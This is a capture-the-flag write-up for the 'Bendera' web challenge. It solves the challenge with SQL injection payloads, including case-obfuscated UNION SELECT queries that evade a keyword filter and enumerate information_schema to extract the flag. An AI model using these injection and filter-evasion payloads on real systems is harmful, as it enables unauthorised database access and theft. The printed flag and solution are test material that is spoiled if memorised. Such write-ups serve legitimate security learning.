# Bendera

> Tengah cari bendera ke tuu
> 
> https://bendera.bahterasiber.my

## Solution
From the source code, looks like the website will query a database, should be a SQLi.

```
    </div>
    <div class="container">
        <!-- /config/waf_config.txt -->
        <!-- $q = "SELECT * FROM tokoh WHERE nama='$namaTokoh'"; -->
        <form method="GET">
            <input type="text" name="cari" placeholder="Cari bendera">
            <input type="submit" value="submit" name="submit">
        </form>
    </div>

    <script src="script.js"></script>
```

I tried with usual UNION SELECT `' union select 1,2,3 #` but looks like there is some filter for query. Trying to obfuscate the query and managed to get some response. 

<img width="727" height="406" alt="image" src="https://github.com/user-attachments/assets/a59ee1e0-d325-4b33-a235-4c3e8c10a019" />

You already know the table name, you can query for column name.
```
' uNioN SeLeCt 1,2,column_name FrOm information_schema.columns WhErE table_name='tokoh' #
```

Then use that column name to query flag inside it.
```
' uNioN SeLeCt 1,2,bendera FrOm tokoh WhErE bendera LIKE '3108{%' #
```

## Flag
```
3108{d4_jUmP@_b3nD3eR4_k3??}
```
